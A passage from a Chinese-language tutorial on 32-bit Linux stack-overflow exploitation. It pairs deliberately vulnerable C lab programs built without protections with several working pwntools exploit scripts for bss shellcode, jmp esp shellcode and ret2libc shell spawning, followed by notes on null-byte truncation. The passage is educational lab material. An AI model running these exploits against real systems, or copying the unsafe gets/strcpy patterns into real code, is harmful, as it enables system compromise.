        char tmpName[10];
        char name[1024];
        puts("hello");
        scanf("%s", name);
        strcpy(tmpName, name);
    }
    void test(){
      system("cat /flag");
    }
    void fun(char a[]){
        printf("%s", a);
        printf("/bin/sh");
    }
    void bad(){
        char a[10];
        puts("start bad");
        gets(c);
        puts(c);
        gets(a);
    }
    int main(int argc, char** argv)
    {
        // SayHello();
        bad();
        return 0;
    }
通过这个练习,我们可以加深对bss的段理解,其地址是固定的,可以存放字符串。
exp.py
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    context.log_level = 'debug'
    context(arch='i386', os='linux')
    # 设置tmux程序
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    # program module
    io = process('./vuln9')
    elf = ELF('./vuln9')
    lib = ELF("/lib/i386-linux-gnu/libc.so.6")
    # rop1 把/bin/sh写入到bss段
    rop1 = elf.symbols['bad']
    # rop2 再次执行漏洞函数
    rop2 = elf.symbols['SayHello']
    gdb.attach(io, 'b *0x08048664')
    pause()
    # system backdoor
    system = elf.symbols['system']
    binsh = '/bin/shx00'
    io.sendlineafter('start bad', binsh)
    retAddress = p32(0xdeadbeef)
    payload = 'A'*0x16 + p32(system) + retAddress +p32(0x08049A80)
    io.sendlineafter('sh', payload)
    io.interactive()
###  0x8.4 bss段写入shellcode
;这个知识点主要是用于绕过开启了nx保护的时候,栈不可执行的特点。
这里我们依然采用上面改动的程序来测试。
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    context.log_level = 'debug'
    context(arch='i386', os='linux')
    # 设置tmux程序
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    # program module
    io = process('./vuln9')
    elf = ELF('./vuln9')
    lib = ELF("/lib/i386-linux-gnu/libc.so.6")
    # rop1 把/bin/sh写入到bss段
    rop1 = elf.symbols['bad']
    # rop2 再次执行漏洞函数
    rop2 = elf.symbols['SayHello']
    # bss 变量地址,可以通过查看ida的bss段来查看。
    bss = p32(0x08049A80)
    io.sendlineafter('start bad', asm(shellcraft.sh()))
    retAddress = p32(0xdeadbeef)
    payload = 'A'*0x16 + bss
    io.sendlineafter('n', payload)
    io.interactive()
###  0x8.5 栈段写入shellcode
我们依然简化下代码,然后重新编译一下
    #include 
    #include 
    //gcc -g -fno-stack-protector -z execstack -no-pie -z norelro  -m32 -o vuln 1.c
    char c[50];
    void bad(){
        char a[10];
        puts("start bad");
        gets(a);
    }
    int main(int argc, char** argv)
    {
        // SayHello();
        bad();
        __asm__("jmp %esp;");
        return 0;
    }
通过这个题目,我们可以学习一下简单ROP思想,看下程序是怎么通过`jmp esp`这样一个片段,从`ret->jmp esp->shellcode`的流程。
exp.py
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    context.log_level = 'debug'
    context(arch='i386', os='linux')
    # 设置tmux程序
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    # program module
    io = process('./vuln1')
    elf = ELF('./vuln1')
    lib = ELF("/lib/i386-linux-gnu/libc.so.6")
    gdb.attach(io, 'b *0x08048664')
    pause()
    # 搜索程序的jmp esp片段
    jmpEsp = elf.search(asm('jmp esp')).next()
    log.success("jmpEsp: " + str(hex(jmpEsp)))
    payload = 'A'*0x16 + p32(jmpEsp) + asm(shellcraft.sh())
    io.sendlineafter('start bad', payload)
    io.interactive()
这里可以分析下为啥是这样构造的:
道理非常简单
程序执行`ret`的时候,这个时候esp是不是指向`p32(jmpEsp)`,
ret 等价于 pop eip;jmp ebp+4
pop eip就是把栈顶元素赋值给eip,然后跳转,pop执行完之后,esp+1,这个时候就是我们的shellcode地址啦。
所以上面的布置公式就是
`payload = 'A'*0x16 + p32(jmpEsp) + asm(shellcraft.sh())`
###  0x8.6 RetLibc系列
这部分,我们采用的是这个代码,其中坑点非常多,初学者极易错的不知其解。
这部分也是我想着重来讲的一部分。
下面看我分析,这里我们选择开启PIE,(开不开也没啥区别, libc地址都是随机化的,必须通过运行程序来泄漏。)
    #include 
    #include 
    //gcc -g -fno-stack-protector -z execstack -no-pie -z norelro  -m32 -o vuln 1.c
    void SayHello()
    {
        char tmpName[10];
        char name[1024];
        puts("hello");
        scanf("%1024s", name);
        strcpy(tmpName, name);
    }
    int main(int argc, char** argv)
    {
        SayHello();
        return 0;
    }
编译的时候保护全关:
`gcc -g -fno-stack-protector -z execstack -no-pie -z norelro -m32 -o vuln6
1.c`
####  0x8.6.1 经典ROP利用
利用libc的话,我们首先要想办法泄漏libc的基地址,这一步也是非常经典,因为程序里面有puts函数,我们可以利用栈溢出来double
jmp,泄漏出libc的地址之后再重新回到漏洞函数来执行。
`__libc_start_main`这个函数是先于`main`函数加载的,所以程序的got表保存的就是其libc的真实地址。
这里我们有两种方法获取到该函数的相对libc偏移:
  * 1.手工计算
`readelf -a /lib/i386-linux-gnu/libc.so.6 | grep '__libc_start_main'`
这里的libc
    10: 00000000     0 FUNC    GLOBAL DEFAULT  UND ___tls_get_addr@GLIBC_2.3 (42)
  * 就是以 00000000 作为基地址的
  * 2.利用pwntools,看我下面的exp
exp.py
    #!/usr/bin/env python
    # -*- coding:utf-8 -*-    from pwn import *
    context.log_level = 'debug'
    context(arch='i386', os='linux')
    # 设置tmux程序
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    # program module
    io = process('./vuln6')
    elf = ELF('./vuln6')
    lib = ELF("/lib/i386-linux-gnu/libc.so.6")
    # vuln address
    SayHello = elf.symbols['SayHello']
    # 程序的got表地址
    libc_start_main_got = elf.got['__libc_start_main']
    # 方法2利用pwntool的ELF模块之间获取
    lib_start_main = lib.symbols['__libc_start_main']
    log.success("SayHello:" + str(hex(SayHello)))
    # 这里开始调试
    gdb.attach(io,'b *0x08048486')
    pause()
    # 利用栈溢出调用puts函数泄漏got表地址
    payload1 = 'A'*0x16 + p32(elf.plt['puts']) + p32(SayHello) + p32(libc_start_main_got)
    # payload1 = 'A'*0x16 + 'B'*4
    # 格式化字符串可以利用栈上的残留来获取
    io.sendlineafter('hell', payload1)
    # 有时候没办法获取的时候加多一个,因为可能有一些垃圾数据
    print("start")
    print(io.recvuntil('n'))
    print("end")
    lib_main = u32(io.recvline()[0:4])
    libc_base = lib_main - lib_start_main
    log.success("libc_base:" + str(hex(libc_base)))
    # 经典retlibc利用公式
    retAddress = p32(0xdeadbeef)
    system = libc_base + lib.symbols['system']
    binsh = libc_base + lib.search("/bin/sh").next()
    payload2 = 'A'*0x16 + p32(system) + retAddress + p32(binsh)
    io.sendlineafter('hello', payload2)
    io.interactive()
很熟悉的利用公式:`payload2 = 'A'*0x16 + p32(system) + retAddress + p32(binsh)`
但是这里是没办法成功,前面我们已经说过了,scanf和strcpy遇到x00是会截断的
很明显我们的system函数00地址结尾的,所以根本没办法传进去。
要么我们来`jmp esp`然后写shellcode?
    jmpesp = libc_base = lib.search(asm('jmp esp')).next()
    payload2 = 'A'*0x16 + p32(jmpesp) + asm(shellcraft.sh())
    io.sendlineafter('hello', payload2)
很遗憾告诉你这样也是不行了, 首先`0b`是execve的系统调用号,但是他同时表示的是制表符,会被scanf截断,导致不能写入栈中,导致失败。
那么是不是没有办法了? 下面介绍一些我对截断绕过的技巧
####  0x8.6.2 解决空白字符截断的技巧
#####  0x8.6.2.0 采用execve函数
`readelf -a /lib/i386-linux-gnu/libc.so.6 | grep 'execve`
可以看到是`b0`结尾ok,那么我们只要找一些gadget补全参数即可。
`ROPgadget --binary /lib/i386-linux-gnu/libc.so.6 --depth 30 --only
'pop|ret'|grep "eax"`
execve与system的层面都不一样,一个是内核层一个是用户层。